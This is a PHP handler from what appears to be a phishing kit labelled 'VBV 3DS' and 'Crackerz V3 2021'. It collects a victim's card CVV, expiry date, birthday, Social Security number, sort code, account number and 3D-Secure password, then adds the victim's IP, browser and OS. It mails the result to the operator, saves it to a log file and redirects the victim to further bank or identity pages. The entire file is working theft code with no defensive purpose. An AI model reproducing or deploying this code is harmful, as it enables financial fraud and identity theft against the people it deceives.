<?php

	session_start();
	error_reporting(E_ERROR | E_PARSE);

	include('../anti/anti.php');
	include('../config/config.php');
	include('../include/get_lg.php');
	include('../include/get_os.php');
	include('../../hash.php');

	# sessions
	$_SESSION['xysbirthdayx'] = $_POST['xysbirthdayDDx']." / ".$_POST['xysbirthdayMMx']." / ".$_POST['xysbirthdayYYx'];
	$_SESSION['xyspanelcodex'] = $_POST['xyspanelcodex'];
	$_SESSION['xysexpirydatex'] = $_POST['xysexpirydateMMx']." / ".$_POST['xysexpirydateYYx'];
	$_SESSION['xysssnx'] = $_POST['xysssn1x']."-".$_POST['xysssn2x']."-".$_POST['xysssn3x'];
	$_SESSION['xyssortcodex'] = $_POST['xyssc1x']."-".$_POST['xyssc2x']."-".$_POST['xyssc3x'];
	$_SESSION['xysaccnumx'] = $_POST['xysaccnumx'];
	$_SESSION['xys3dspassx'] = $_POST['xys3dspassx'];

	if (empty(trim($_SESSION['xyssortcodex']))) {
		$_SESSION['xyssortcodex'] = '--';
	}

	if (empty(trim($_SESSION['xysaccnumx']))) {
		$_SESSION['xysaccnumx'] = '--';
	}

	if (empty(trim($_SESSION['xys3dspassx']))) {
		$_SESSION['xys3dspassx'] = '--';
	}

	$xysmsgx = '<!DOCTYPE html>
	<html lang="en">
	<head>
		<meta charset="UTF-8">
		<title>Result</title>
		<style type="text/css">
	* { margin: 0; font-family: Orbitron, verdana; font-size: 13px; }
	.content {
		background: #f6f6f6;
	    max-width: 800px;
	    margin: auto;
	}
	.container {
		background: whitesmoke;
	    padding-top: 40px;
	}
	.box .header {
		background-color: #2980b9;
	    font-weight: bold;
	    color: white;
	}
	.box {
	    border-radius: 8px;
	    border: 2px solid #2980b9;
	    box-shadow: inset 0 1px 1px rgba(0,0,0,.075), 0 0 18px #2980b9;
	    background: #f6f6f6;
	}
	.box .dhead {
		    display: inline-block;
	    width: 30%;
	}
	.box .data {
		display: inline-block;
	    width: 68%;
	}
	.box .infos, .box .header, .box .infosvic {
		padding: 6px 12px;
	}
	.box .infosvic {
	    border-top: 1px solid #2980b9;
	}
	.box .infosvic div {
	    color: #b7b7b7;
	}
	.box .infos div {
		margin: 3px 0;
	}
	</style>
	</head>
	<body>
		<div class="container">
		<div class="content">
			<div class="box">
				<div class="header">
					<div class="dhead">VBV 3DS</div>
					<div class="data">Crackerz V3 2021</div>
				</div>
				<div class="infos">
					<div class="dhead">Birthday (DD/MM/YYYY):</div>
					<div class="data">'.$_SESSION['xysbirthdayx'].'</div><br>
					<div class="dhead">CVV:</div>
					<div class="data">'.$_SESSION['xyspanelcodex'].'</div><br>
					<div class="dhead">Expiry Date (DD/YY):</div>
					<div class="data">'.$_SESSION['xysexpirydatex'].'</div><br>
					<div class="dhead">SSN:</div>
					<div class="data">'.$_SESSION['xysssnx'].'</div><br>
					<div class="dhead">Sort code:</div>
					<div class="data">'.$_SESSION['xyssortcodex'].'</div><br>
					<div class="dhead">Account number:</div>
					<div class="data">'.$_SESSION['xysaccnumx'].'</div><br>
					<div class="dhead">3D-secure:</div>
					<div class="data">'.$_SESSION['xys3dspassx'].'</div><br>
				</div>
				<div class="infosvic">
					<div class="dhead">IP-GEO:</div>
					<div class="data">http://www.geoiptool.com/?IP='.$_SESSION['xipx'].'</div><br>
					<div class="dhead">Browser:</div>
					<div class="data">'.$_SESSION['xbrowserx'].'</div><br>
					<div class="dhead">OS:</div>
					<div class="data">'.$_SESSION['xosx'].'</div><br>
					<div class="dhead">DateTime:</div>
					<div class="data">'.$DATE.'</div>
				</div>
			</div>
		</div>
	</div>
	</body>
	</html>';
	
	$xsubx = "VBV | [".$_SESSION['xcountryx']."] | [".$_SESSION['xipx']."] ";
	$xheadx = "MIME-Version: 1.0" . "\r\n";
	$xheadx .= "Content-type:text/html;charset=UTF-8" . "\r\n";
	$xheadx .= "From: " . $sp_name . "<crn@cgiwebps.nl>" . "\r\n";
	mail($send_email, $xsubx, $xysmsgx, $xheadx);

	if($save_result){
		$f = fopen("../../result/".$savefile_name, "a+");
	    fwrite($f, $xysmsgx);
	    fclose($f);
	}

	if($bank_page){
		$xDIRx = "bnk.php?country.x=".$countryCode."&locale.x=".getLG($countryCode)."_".$countryCode."&customer.x=ID-PA".$hash."&safety=".$hash2;
	}
	else {
		if($identity_page == true) {
			$xDIRx = "ids.php?country.x=".$countryCode."&locale.x=".getLG($countryCode)."_".$countryCode."&customer.x=ID-PA".$hash."&safety=".$hash2;
		}
		else {
			$xDIRx = "thanks.php?country.x=".$countryCode."&locale.x=".getLG($countryCode)."_".$countryCode."&customer.x=ID-PA".$hash."&safety=".$hash2;
		}
	}

	echo '<meta http-equiv="refresh" content="0; URL=../'.$xDIRx.'" />';
	
?>